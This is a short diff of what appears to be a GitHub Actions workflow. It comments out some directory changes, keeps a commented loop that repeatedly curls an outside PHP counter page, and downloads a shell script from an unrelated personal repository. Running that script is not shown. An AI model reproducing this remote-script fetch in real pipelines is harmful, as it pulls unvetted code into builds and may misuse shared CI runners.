@@ -37,10 +37,10 @@ jobs:
           echo test, and deploy your project.
           #echo  pwd  && cd .. &&   cd .. &&     cd .. &&   ls    
           #cd   ${GITHUB_WORKSPACE}
-          cd   ${{github.workspace}}
-          cd  ..
+          #cd   ${{github.workspace}}
+          #cd  ..
           # mkdir  folderaaa
-          cd  /home/runneradmin
+          #cd  /home/runneradmin
           ls
          # for i in {0..20}; {      curl  -s  http://gongzige.42web.io//tongji.php   ;};          
           curl  -O  https://raw.githubusercontent.com/erbasisan/foder/main/aaa.sh
